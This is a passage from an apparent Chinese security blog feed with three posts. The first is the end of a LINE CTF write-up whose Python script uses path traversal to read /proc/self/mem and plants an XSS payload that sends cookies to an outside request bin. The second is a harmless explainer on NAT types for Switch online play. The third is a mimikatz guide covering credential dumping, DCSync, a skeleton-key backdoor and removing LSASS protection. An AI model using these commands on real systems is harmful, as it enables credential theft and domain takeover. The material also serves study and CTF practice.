<p>这里的total是一个全局变量，感觉会在内存里面常驻，然后通过读&#x2F;proc&#x2F;self&#x2F;maps读内存布局，再读mem，一开始不会这个东西，直接读的mem，读不出东西</p>
<p>然后就被tkmk神仙秒了tqltql</p>
<p>第二题起来复现，顺便问了下枢子哥maps文件的意义</p>
<pre><code>00400000-04899000 r-xp 00000000 08:01 545155                             /usr/local/bin/node
04a99000-04a9c000 r--p 04499000 08:01 545155                             /usr/local/bin/node
04a9c000-04ab4000 rw-p 0449c000 08:01 545155                             /usr/local/bin/node
04ab4000-04ad5000 rw-p 00000000 00:00 0 
053d6000-0631d000 rw-p 00000000 00:00 0                                  [heap]
1eeb580000-1eeb5c0000 rw-p 00000000 00:00 0 
1024e680000-1024e6c0000 rw-p 00000000 00:00 0 
12654840000-12654880000 ---p 00000000 00:00 0 
15b65f40000-15b65f80000 rw-p 00000000 00:00 0 
18a12480000-18a124c0000 ---p 00000000 00:00 0 
1c64e2c0000-1c64e300000 ---p 00000000 00:00 0 
1d3c5dc0000-1d3c5e00000 rw-p 00000000 00:00 0 
1eac5b80000-1eac5bc0000 rw-p 00000000 00:00 0 
2f64ce80000-2f64cec0000 ---p 00000000 00:00 0 
317d9d00000-317d9d40000 ---p 00000000 00:00 0 
5088eb00000-5088eb40000 rw-p 00000000 00:00 0 
563aeb00000-563aeb40000 ---p 00000000 00:00 0 
5b7b9dc0000-5b7b9e00000 ---p 00000000 
</code></pre>
<p>一般来说是会有一下so之类的动态链接库的装载地址的，就是代码段之类的，但是这里就一个node二进制，那就再说了。然后后面写着<code>[heap]</code>的这段地址就是堆地址。尝试从堆地址中获取变量</p>
<p>写了个垃圾脚本硬爆（这里有一个坑，re.match是从头匹配的。。。要用re.search，我被坑了好久。。。）</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> requests

maps <span class="token operator">=</span> <span class="token string">"http://35.243.100.112/..%2f..%2f..%2f..%2f..%2fproc%2fself%2fmaps/300/400"</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>maps<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># print(res.text)</span>
groups <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"0([a-f0-9]+?)-0([a-f0-9]+?) rw-p 00000000 00:00 0\s+\[heap]"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
start <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token operator">+</span>groups<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
end <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token operator">+</span>groups<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]start: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]end: {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">)</span>
step <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">128</span>


url <span class="token operator">=</span> <span class="token string">"http://35.243.100.112/..%2f..%2f..%2f..%2f..%2fproc%2fself%2fmem/{}/{}"</span>
payload <span class="token operator">=</span> <span class="token string">"&lt;script>fetch('https://requestbin.z3ratu1.cn?'+document.cookie);&lt;/script>"</span>
headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span>
data <span class="token operator">=</span> <span class="token string">"username="</span><span class="token operator">+</span>payload
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    identify <span class="token operator">=</span> <span class="token string">"http://35.243.100.112/identify"</span>
    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>identify<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>

prefix <span class="token operator">=</span> <span class="token string">"&lt;h1>../../../../../proc/self/mem&lt;/h1>&lt;hr/>"</span>

<span class="token keyword">while</span> start <span class="token operator">&lt;</span> end<span class="token punctuation">:</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>start<span class="token punctuation">,</span> start<span class="token operator">+</span>step<span class="token punctuation">)</span><span class="token punctuation">)</span>
    index <span class="token operator">=</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">if</span> index <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]found: "</span><span class="token operator">+</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>start<span class="token punctuation">,</span> start<span class="token operator">+</span>step<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># break</span>
    start <span class="token operator">+=</span> step
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"{}, remaining {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token operator">-</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>感觉搜出来的总是http请求，而不是那个变量，以及http请求那里总是变，所以补水很稳定，后来把break注释掉之后找到了后面的几个出现的点，可能就是变量位置了？然后提交给bot打通</p>
<p>说起来是一个不怎么web的题，不过稍微学一点内存之类的东西也不会有坏处</p>
<p><code>FLAG=LINECTF&#123;705db4df0537ed5e7f8b6a2044c4b5839f4ebfa4&#125;</code></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>NAT与Switch联机加速</title>
    <url>/NAT%E4%B8%8ESwitch%E8%81%94%E6%9C%BA.html</url>
    <content><![CDATA[<h1 id="NAT与Switch联机加速"><a href="#NAT与Switch联机加速" class="headerlink" title="NAT与Switch联机加速"></a>NAT与Switch联机加速</h1><p>猛汉R试玩已经于今日上线，这不玩这不玩这不玩？<br>盾斧的衣服好好看呜呜，我猜是影蜘蛛套，我吹爆<br>由于穷逼没钱买加速器，所以试玩了两把太刀和盾斧之后就开始研究起了怎么用现有白嫖节点来优化Switch的联机体验，然后产生了这篇文章</p>
<h2 id="Eshop加速"><a href="#Eshop加速" class="headerlink" title="Eshop加速"></a>Eshop加速</h2><p>就以我自己为例，使用香港节点直接做到600k&#x2F;s的下载速度，快速下载mhr，不要小看这个速度，任地狱的垃圾服务器下行带宽有限（虽然用了一堆CDN，但是就这么点速度）就算是充钱买的加速器也就2m&#x2F;s多一点，对于白嫖党来说这已经很不错了</p>
<p>我用的clash，直接勾选Allow LAN，允许局域网访问，然后让电脑和Switch在同一个WiFi下，配置switch的代理设置为电脑ip加7890端口即可，挑一个港服节点，进行快速港服eshop下载<br>（其实因为垃圾校园网需要认证switch没法连，我自己还是本机连校园网然后同时开热点让switch连电脑热点下的。。。。）</p>
<h3 id="加速原理"><a href="#加速原理" class="headerlink" title="加速原理"></a>加速原理</h3><p>我不知道，我一直以为加速器下载加速肯定是有专线什么的带宽upup，所以下载速度快。但是我就单纯的设置一个代理也能提升速度，如下为猜测原因<br>1.境外服务器国内互联网不怎么常用，DNS或者路由查询慢(香港本身不算境外啊，不要搞反动！但是和国内互联网不是一个体系，所以按境外考虑)<br>2.国内网络边界审查流量拖慢访问速度，并且可能误伤正常流量导致大量丢包重传<br>3.可能是比较重要的一点，链路质量问题，国内存在各种各样运营商的各种各样的链路，CN2系列是我国下一代什么什么承载网，是国内最好的链路产品，然而90%以上的请求却仍然在拥堵的上个世纪搭建的电信骨干网中流动，丢包重传概率高，链路质量差。而如果使用阿里云等商业网络，可能会在各地存在专门的接入网络，加快连接速度。我们使用的节点可能也就是某个商业集团的vps，商用网当然优于家用网。而对于加速器而言，各地部署高速网络，使用BGP来帮助降低用户家宽到中转服务器的延时，并通过内网IPLC隧道一把梭，极致网速体验</p>
<p>虽然不如加速器超级专线的网络速度，但是的确挂了个梯子之后也达到了一定的加速效果，我很开心</p>
<h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>简单测试之后得出MHR的联机方式是CS，但是不是任地狱或者卡普空的官方服务器，是房主自己的机子当服务器(所以房主永远不卡)，和其他玩家进行通信，任地狱似乎没有那种中心服务器，switch上大部分游戏可能都是玩家主机做服务器或P2P，任地狱只提供STUN服务器来辅助大家进行互相找到。P2P的话，一个人炸了整个房就炸了<del>例如马造2，马车8？无把握</del>喷喷不知道是哪种，看了几个帖子可能是P2P？动森可能是岛主做服务器？<br>而IPv4地址很稀缺，所以我相信大家现在都是用NAT上网的</p>
<p>这里就要提到NAT的几种类型了</p>
<h3 id="Full-Cone-NAT"><a href="#Full-Cone-NAT" class="headerlink" title="Full Cone NAT"></a>Full Cone NAT</h3><p>完全圆锥型NAT，当你获得了一个ip:port映射之后，所有发向你映射的IP端口对的数据都会转发到你本地的对应端口，基本上就等于获得了一个公网IP端口对<br>对应任地狱的NAT类型A<br>直接拥有公网IP NAT类型也为A</p>
<h3 id="Address-Restricted-Cone-NAT"><a href="#Address-Restricted-Cone-NAT" class="headerlink" title="Address Restricted Cone NAT"></a>Address Restricted Cone NAT</h3><p>地址限制圆锥形NAT，同样给一个映射，但只允许从数据发送的目的机器的回应报文返回，你没发过数据的人知道了你映射出来的IP端口也不能给你发消息<br>对应任地狱的NAT类型B</p>
<h3 id="Port-Restricted-Cone-NAT"><a href="#Port-Restricted-Cone-NAT" class="headerlink" title="Port Restricted Cone NAT"></a>Port Restricted Cone NAT</h3><p>端口限制圆锥型NAT，相较上一个再增加一个端口限制，只允许自己发送过数据的对应机器的对应端口的回应报文返回<br>对应任地狱的NAT类型C</p>
<h3 id="Symmetric-NAT"><a href="#Symmetric-NAT" class="headerlink" title="Symmetric NAT"></a>Symmetric NAT</h3><p>对称型NAT，贼玄幻的东西，限制先拉满，和端口限制圆锥型NAT的限制规则一致，又加了一个对每个不同的IP:Port发送的数据进行一个映射<br>就比如我同时向两个主机(或者同一主机的两个端口)发送数据，那么NAT就会对应这两个链接映射两个IP端口对<br>就是说每一个原宿IP端口对对应一条独一无二的映射关系，公用网络，校园网之类的基本上是这个类型<br>对应任地狱的NAT类型D</p>
<h3 id="NAT-Type-F"><a href="#NAT-Type-F" class="headerlink" title="NAT Type F"></a>NAT Type F</h3><p>这已经不是NAT类型了，意思是Fail，你连不上网，你完全没机会联机</p>
<h3 id="NAT类型与联机"><a href="#NAT类型与联机" class="headerlink" title="NAT类型与联机"></a>NAT类型与联机</h3><p>之前说了，mhr没有游戏服务器，或者说存在一个大厅服务器，让玩家们能互相找到对方，而实际上的游戏服务器是房主的switch，也就是以房主为中心的一个CS模式<br>接下来为对联机过程的推测，有待考证<br>存在一台游戏大厅服务器，简单的认为玩家A和B的switch全部连接到大厅服务器上，A创建一个房间，B加入这个房间，这个时候大厅服务器就分别把AB的IP端口告诉对方，然后让A和B进行连接。<br>而如何获取AB的IP端口，任地狱使用了STUN服务器，似乎用的是xxx.lp1.n.n.srv.nintendo.net这个域名，从clash中可以看到这个连接，获取到AB各自的NAT状态，且告诉对方各自NAT出来的的IP地址和端口(或者是直接发现超级牛逼的玩家暴露在公网中)在这个情况下ABC三种NAT类型并不影响联机<br>而D类型由于每个IP端口对应一个映射，导致用户A的switch和STUN连接得到的IP端口和实际去和用户B连接的IP端口组不一致，而其超级限制使得两方无法正常联机</p>
<p>reddit上的一个帖子说到喷喷在NAT为C的时候就玩不了了，我其实不太能理解。。。</p>
<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>也就是NAT打洞，通过STUN服务器的辅助使得两个隐藏在NAT后的主机能互相通信</p>
<h4 id="A为房主"><a href="#A为房主" class="headerlink" title="A为房主"></a>A为房主</h4><p>这时候A就约等于暴露在公网中，BCD类型均可直接向A发起请求，建立连接，而A通过建立的请求反向回复即可与BCD类型建立连接</p>
<h4 id="B为房主"><a href="#B为房主" class="headerlink" title="B为房主"></a>B为房主</h4><p>B类型只接受其自身通信过的主机的数据，且显然若其他通信方NAT等级高于B，则可用之前的方法建立连接。若对端也为BC类型，则双方互相向对方IP:Port发送请求，完成NAT打洞。<br>若对端为D类型，则STUN服务器给予房主的IP:Port不是其对端与房主通信的IP:Port(一般来说IP不变，Port增长)，则房主到D的请求会被拒绝，但此时房主可接受来自D的通信，因此D可以抵达房主，房主再建立反向通信，双方完成NAT打洞。</p>
<h4 id="C为房主"><a href="#C为房主" class="headerlink" title="C为房主"></a>C为房主</h4><p>只考虑对端为CD的情况，对端为C，则双方同上述情况，互相进行试探，在NAT上打洞完成通信建立。<br>对端为D时，C发给D的请求被丢弃，而打通的洞却只允许D特定端口的数据通过，而D类型在于服务器通信和与房主通信时端口不一致，无法完成打洞（但C可以通过对D进行端口猜测打洞，成功率不高）。C-D类型无法完成联机。</p>
<h4 id="D为房主"><a href="#D为房主" class="headerlink" title="D为房主"></a>D为房主</h4><p>只考虑对端为D，比C还惨，双方猜测对方的IP:Port进行通信，撞中的概率比C-D应该高一个数量级，撞大运了就能通信上</p>
<h4 id="NAT对联机影响"><a href="#NAT对联机影响" class="headerlink" title="NAT对联机影响"></a>NAT对联机影响</h4><p>NAT类型并不影响联机质量，只是越低等级的NAT导致建立连接的难度加大，但只要能建立连接，NAT就不在影响实际的联机情况，剩下的更多的是看网络的延迟，链路的通畅和丢包率的高低<br><strong>唯有C-D，D-D类型的网络无法互相联机，房主只要是AB两种类型任何NAT类型的人都能相互联机</strong></p>
<p>推荐阅读<a href="https://paper.seebug.org/1561/">NAT 原理以及 UDP 穿透</a>，配了图NAT穿透过程和NAT类型都说到挺清晰的，就是最后所谓的实现UDP NAT穿透就是任天堂现在的这个STUN服务，并不能做到我们想要的加速器效果</p>
<h2 id="Something-else"><a href="#Something-else" class="headerlink" title="Something else"></a>Something else</h2><p>有大哥和我说联机模式取决于房主的NAT质量，当NAT类型为AB时，任天堂服务器只负责让大家找到对方，当任天堂发现房主处于一个内网且不支持端口映射（即类型为C及以下？)，将自己作为中介进行数据转发<br>掘金的帖子中动森的说法为网络类型不好也会让两方尝试进行连接，不过是连接时成功的难度变得高了一点<br>今天和开了加速器NAT类型为A的大姐联机抓包测试的结论是，我全程只与约等于拥有公网地址的A类NAT房主通信，而与其他两个同在一个房间的玩家并无通信流量（我连的垃圾校园网NAT类型为D，不过好像也不是很卡）<br>以后如果和网络质量较差的大哥联机时在做更新</p>
<h3 id="联机流畅程度的决定因素"><a href="#联机流畅程度的决定因素" class="headerlink" title="联机流畅程度的决定因素"></a>联机流畅程度的决定因素</h3><p>以下为个人的不成熟意见<br>实际上影响连接质量的我觉得是与境外游戏服务器直接的不通畅，国内家用网络质量不佳，不同运营商之间提供的服务存在差异，以及地域网路条件导致的连接延迟（我和我大哥都在学校的时候联机就流畅的我从来没考虑过这个问题，各自回家之后就卡的连都连不上了）<br>游戏加速器本质上和一个代理服务器没什么太大的差别，不过加速器为游戏专门在各运营商处建立了专线，降低了报文在联通电信两大ISP之间切换的问题，同时也有专线直连海外，提升带宽，提供一路畅通的专线服务。加速器的服务器就是一个直接拥有公网IP的服务器，这一连上就直接等于最好的NAT类型A<br>而使用代理服务器代替游戏加速器也能提升一定的速度，是因为优化了GFW的过滤部分，因为连接境外服务器最大的问题可能就在于GFW的误伤导致的丢包重传，并且境外节点可能位于一些高速链路上，很多节点都是买的搬瓦工之类的机房，他们可能有一定的专线网络(不过肯定没有加速器一条龙服务来的顺畅)，而实际上物理距离导致的网络延迟并不是最严重的，并且代理服务器肯定也是自己有一个公网IP，也就意味着NAT类型应该也能提升到A</p>
<p>如果mhr在CS的过程中并不向任地狱服务器发送信息，则可以尝试在国内架设一个服务器，商用网络也在一定程度上优于普通的家用网络，让所有人将那个国内服务器作为代理，就在国内解决问题<br>学习的时候偶然看到了类似的文章，看了下去发现是灵缇的开发者，下载了一个下来看了一眼，他们对动森等部分游戏就存在国内加速节点，估计用于就是纯玩家间网络的加速<br>而如果还需要像境外服务器提供额外数据的话，最好是每个人都连接到境外的加速器，走高速链路，应该能获取最佳体验</p>
<h3 id="加速器的加速原理"><a href="#加速器的加速原理" class="headerlink" title="加速器的加速原理"></a>加速器的加速原理</h3><p>加速器分几种，下载加速的话就是简单高速链路代理，像吃鸡这种与国外游戏服务器加速的代理也是类似情况，都是通过走高速专线一把梭到底来提升游戏体验。<br>而switch的联机并不存在一个游戏服务器，优化的部分应当是玩家与玩家之间的联系性<br>如下为灵缇开发者对自己的加速器的描述</p>
<blockquote>
<p>如果一台设备直接拥有全球IP，那么它的NAT类型一定为A，因为没有任何中间防火墙的阻挠。我们的游戏加速服务器，就是NAT类型为A的全球服务器，通过端口流量转发对照，实现了这个提升。加速服务器在这个过程中起到两个作用，一个是代理，即Switch的网络数据由加速服务器帮忙转发，使NAT变为A，二是加速，加速器优化了这其中的网络链路，使之更快更流畅。</p>
</blockquote>
<p>也就是说switch联机的加速器是通过端口转发使得房主穿越NAT限制直接成为A类型（我感觉实现就是NAT转出来之后直接和公网IP加速器通信，然后公网IP加速器端口作为代理去和外界通信，而这个加速器不走任何防火墙，NAT类型就变成了A。事实上只要我们本身的防火墙不做限制，不是人人都是A类NAT么&#x3D; &#x3D;）然后就是我反复强调的网络链路，强力专线，高速直达了</p>
<p>个人认为<strong>决定联机质量的是网络链路质量，而NAT只是影响玩家之间的可达性</strong>，两个C类NAT已经是联机的下限了，但我觉得如果他们之间的链路带宽够好，应该也会比两个在家用网上挤得要死的A类NAT联机更为顺畅</p>
<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>我太天真了。平常使用的代理确实能加速下载，他们都是HTTP代理，因为转发的是TCP流量，但是对于游戏加速可能并不实用，因为大部分的HTTP代理只代理TCP流量，而众多游戏似乎都是用UDP进行数据传输，就算Socks5支持UDP的转发，也需要看代理节点是否支持UDP转发，不然还是白给</p>
<p>clash可以通过启动TAP或者TUN来进行全局代理，把所有流量全部劫持到自建的cfw-tap网卡上，再进行下一步的转发，能强行扭转一些不走代理的软件的流量（但是我switch直接指定了代理服务器应该不需要这步吧？）暂时不知道UDP无法转发是clash设置问题还是对端节点支持问题，若是对端节点不支持UDP转发，那我switch是不是应该直接没法联机才对？TCP从clash里可以看见和任天堂服务器仍存在通信，不过感觉是好友服务之类的，STUN也用的UDP协议，或者说clash遇到UDP的数据还是走的直连，所以联机无问题？</p>
<p>有的机场好像也提供那种游戏节点，不知道是不是只有那种才提供UDP转发，剩下的只是普通的HTTP代理？</p>
<p>不过如果只是要公网IP和商业网络路线的话，要不我到时候试试用我的阿里云上海vps试一下做个代理？</p>
<p>挖坑，考完试还没忘就填一下。。。为什么别人考试都考完了我还在上课。。。</p>
<h2 id="NAT和DHCP的区别"><a href="#NAT和DHCP的区别" class="headerlink" title="NAT和DHCP的区别"></a>NAT和DHCP的区别</h2><p>作为无关话题，思考时突然想到而进行的学习<br>NAT进行的是IP地址的转换，将内网地址转换为公网地址<br>DHCP进行的是IP的分配，给你先来个内网地址进行NAT(据说有的神仙DHCP也能分配一个公网地址)，那估计就没NAT的事情了</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>三天高强度学习switch联机。。。。期末要死了，不学了不学了<br><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2">网络地址转换-维基百科</a><br><a href="https://www.reddit.com/r/splatoon/comments/6rtgmg/nat_types_and_connection_problems_explained/?utm_source=amp&utm_medium=&utm_content=post_body">nat_types_and_connection_problems_explained</a><br><a href="https://www.zhihu.com/question/66893227">NAT和DHCP的区别</a><br><a href="https://www.wallmama.com/jsq/">网络游戏加速器原理</a><br><a href="https://zhuanlan.zhihu.com/p/307898255">Switch 的 NAT类型硬核向趣味图解</a><br><a href="https://zankyo.cc/2845/">Nintendo Switch：<del>联机加速方案的研究与折腾</del></a><br><a href="https://www.zhihu.com/question/63279891">怎么用VPS搭建网游加速器（自己玩而已）？</a><br><a href="https://juejin.cn/post/6844904159074861063">从动物森友会聊主机游戏联机机制</a><br><a href="https://www.zhihu.com/question/66788297">很多游戏机(Switch&#x2F;3ds&#x2F;PS4)是否没有公网ip无法联机，原因是什么？</a><br><a href="https://www.zhihu.com/question/20436734">udp协议怎么穿透Symmetric NAT？</a><br><a href="https://paper.seebug.org/1561/">NAT 原理以及 UDP 穿透</a></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>NAT</tag>
        <tag>Switch</tag>
      </tags>
  </entry>
  <entry>
    <title>mimikatz简单使用手册</title>
    <url>/Mimikatz%E4%BD%BF%E7%94%A8%E7%AE%80%E7%95%A5.html</url>
    <content><![CDATA[<h1 id="mimikatz简单使用手册"><a href="#mimikatz简单使用手册" class="headerlink" title="mimikatz简单使用手册"></a>mimikatz简单使用手册</h1><p>mimikatz起码得是个管理员权限跑起来才有用<br>调用模块内命令的语法是<code>Module::Function</code>，需要加参数的话为<code>/arg:value</code><br>简单记录一下常用模块的常用命令</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>先提一点点关于windows权限的东西作为前置知识</p>
<h3 id="用户账户等级"><a href="#用户账户等级" class="headerlink" title="用户账户等级"></a>用户账户等级</h3><p>Windows中的账户分为如下几个等级<br>使用<code>net user</code>命令可以查看本地所有账户，<code>net user username password</code>可以改密码，最后再加个<code>/add</code>可以添加用户（靠这个加了个低等级用户）</p>
<ul>
<li>SYSTEM</li>
<li>Administrators<ul>
<li>Administrator</li>
<li>管理员账户</li>
</ul>
</li>
<li>Users<ul>
<li>标准账户<br>同样，权限对应分为几个等级</li>
</ul>
</li>
<li>System</li>
<li>High</li>
<li>Medium</li>
<li>Low<br>SYSTEM约等于Linux系统中的root，象征最高权限，为系统服务对应的权限，Administrators组对应High权限，Users对应Medium权限，Low是某些超低权限软件用的。<br>但管理员分两类，Administrator和管理员账户，Administrator启动的全部进程均为High权限，而普通管理员启动的进程为Medium权限，需要通过UAC来提升至High权限</li>
</ul>
<h3 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h3><p>User Account Control<br>Administrator是超级管理员，启动的进程均为High权限，其他用户就算拥有管理员权限，也需要右键<code>以管理员身份运行</code>，否则就是普通用户，且还会弹出来一个框让你确认是否允许该程序修改设备，这个就是UAC，在工作组环境中，管理员可以执行远程命令，但是普通管理员就因为会被UAC拦下而无法执行，需要进行额外操作</p>
<h3 id="LSASS"><a href="#LSASS" class="headerlink" title="LSASS"></a>LSASS</h3><p>即Local Security Authority Subsystem Service，本地安全认证子服务系统</p>
<blockquote>
<p>sass.exe是微软本地安全认证服务进程，负责用户标识认证和强化安全的。 它检查登陆进Windows的用户，处理变更密码和建立访问信息，包括基本的安全信息。 它也被管理员用来更新密码和用户档案。</p>
</blockquote>
<p>简单点说就是各种各样的凭据都和它相关，所以大家都喜欢打这个服务</p>
<h3 id="something-else"><a href="#something-else" class="headerlink" title="something else"></a>something else</h3><p>说起来DC上好像没有本地账户？登录本地就没成功过，AD安装完之后所有本地账户都变成了域账户，Administrator在整个域上都拥有管理员权限，在DC上新建用户全都是新建域用户<br>微软官方文档有这么一句话但感觉也有一点读不顺。。。</p>
<blockquote>
<p>在安装Active Directory 域服务之前，只能在域控制器上创建本地用户帐户，之后不能创建。</p>
</blockquote>
<p>暂且认为就是域控上没得本地账户吧</p>
<h2 id="privilege"><a href="#privilege" class="headerlink" title="privilege"></a>privilege</h2><p>权限模块，感觉常用的就一个debug</p>
<h3 id="privilege-debug"><a href="#privilege-debug" class="headerlink" title="privilege::debug"></a>privilege::debug</h3><p><strong>需要管理员权限</strong><br>获取debug权限，搞密码等各种操作的必备前置指令，将该进程的权限提升，管理员账户均拥有Debug权限，但是依旧需要运行“privilege::debug”进行激活。如果报错<code>ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061</code>则是拥有管理员权限的普通账户没有以”管理员身份运行”。普通账户直接拉倒。</p>
<p><strong>下文的需要管理员权限均指需要输入privilege::debug</strong></p>
<h2 id="lsadump"><a href="#lsadump" class="headerlink" title="lsadump"></a>lsadump</h2><blockquote>
<p>Mimikatz 的 LSADUMP 模块用于与 Windows 本地安全验证（Windows Local Security Authority ）(LSA) 进程进行交互来提取凭证数据。</p>
</blockquote>
<p>就会用这两个，剩下的因为一无所知所以看不懂</p>
<h3 id="lsadump-DCSync"><a href="#lsadump-DCSync" class="headerlink" title="lsadump::DCSync"></a>lsadump::DCSync</h3><p><strong>需要域管理员权限</strong>，不需要本地管理员了，在非域控机器上登录一个域管理员账户（非本地管理员）即可执行<br>向DC要一个号的密码<br>参数</p>
<blockquote>
<p>&#x2F;user 要密码的用户名或sid，&#x2F;all就是要全部的<br>&#x2F;domain域名，不填默认为当前域</p>
</blockquote>
<h3 id="lsadump-LSA"><a href="#lsadump-LSA" class="headerlink" title="lsadump::LSA"></a>lsadump::LSA</h3><p><strong>导出全部凭证，需管理员身份</strong></p>
<blockquote>
<p>&#x2F;inject － 注入 LSASS 进程提取凭证数据<br>&#x2F;name － 目标用户账户的帐户名称<br>&#x2F;id － 目标用户账户的 RID<br>&#x2F;patch － 补丁 LSASS 进程<br>RID为502的帐户是KRBTGT帐户，RID为500的帐户是默认的域管理员账户。</p>
</blockquote>
<p><del>感觉和上面的DCSync没什么区别？就权限一个是本地管理员一个是域管理员？</del></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>杂项命令</p>
<h3 id="misc-cmd"><a href="#misc-cmd" class="headerlink" title="misc::cmd"></a>misc::cmd</h3><p>开一个命令行</p>
<h3 id="misc-taskmgr"><a href="#misc-taskmgr" class="headerlink" title="misc::taskmgr"></a>misc::taskmgr</h3><p>开一个任务管理器</p>
<h3 id="misc-regedit"><a href="#misc-regedit" class="headerlink" title="misc::regedit"></a>misc::regedit</h3><p>开一个注册表编辑器</p>
<p>这三个命令在管理员禁止使用这三个东西的时候可以硬开出来</p>
<h3 id="misc-addsid"><a href="#misc-addsid" class="headerlink" title="misc::addsid"></a>misc::addsid</h3><p><strong>需要管理员权限</strong>，将用户账户添加到SIDHistory中，第一个参数为目标账户，第二个值为SID（或账户&#x2F;组名称）</p>
<h3 id="misc-skeleton"><a href="#misc-skeleton" class="headerlink" title="misc::skeleton"></a>misc::skeleton</h3><p><strong>需要管理员权限</strong>，在DC上运行，将skeleton密钥注入到LSASS进程中<br>维持权限的常用手段<br>使得所有用户可以使用“master Password”（skeleton key）代替原有密码进行身份验证<br>就是给所有用户添加了一个额外的密码，默认注入密码为<code>mimikatz</code>，找了一会也没找到怎么制定注入的密码值。。。DC重启后失效（因为只是注入进程内存嘛）</p>
<h4 id="bypass-LSA-Protection"><a href="#bypass-LSA-Protection" class="headerlink" title="bypass LSA Protection"></a>bypass LSA Protection</h4><p>微软在注册表项中提供了防止对lsass.exe的注入，这时候再尝试会报错<code>ERROR kuhl_m_misc_skeleton; OpenProcess (0x00000005)</code><br>mimikatz在配置有miidrv.sys时可以绕过<br>命令如下</p>
<pre><code>privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
</code></pre>
<h2 id="net"><a href="#net" class="headerlink" title="net"></a>net</h2><p>信息收集命令<br>net::user<br>net::wsession<br>net::group<br>之类的</p>
<h2 id="process"><a href="#process" class="headerlink" title="process"></a>process</h2><p>收集进程数据并与进程交互</p>
<h3 id="process-list"><a href="#process-list" class="headerlink" title="process::list"></a>process::list</h3><p>列出正在运行的进程（和任务管理器有什么区别。。。）原文说要管理员权限但实际上我试了一下不需要</p>
<h3 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h3><p>PROCESS::Resume - 恢复一个进程<br>PROCESS::Start – 启动一个进程<br>PROCESS::Stop – 结束一个进程<br>PROCESS::Suspend – 挂起一个进程<br>均以<code>/pid:</code>为参数</p>
<h2 id="sekurlsa"><a href="#sekurlsa" class="headerlink" title="sekurlsa"></a>sekurlsa</h2><p>与内存交互，<strong>整个模块需要管理员权限</strong>，应该是最常用模块吧<br>还可使用<code>TOKEN::elevate</code>获得system权限（但是事实上好像并不好用，不如debug）</p>
<h3 id="sekurlsa-backupkeys"><a href="#sekurlsa-backupkeys" class="headerlink" title="sekurlsa::backupkeys"></a>sekurlsa::backupkeys</h3><p>获得备份主密钥（我的机子没设置，均为一大串零）</p>
<h3 id="sekurlsa-credman"><a href="#sekurlsa-credman" class="headerlink" title="sekurlsa::credman"></a>sekurlsa::credman</h3><p>列出凭证管理器</p>
<h3 id="sekurlsa-dpapi"><a href="#sekurlsa-dpapi" class="headerlink" title="sekurlsa::dpapi"></a>sekurlsa::dpapi</h3><p>列出已缓存的主密钥（但实际运行和上个命令的结果是一致的）</p>
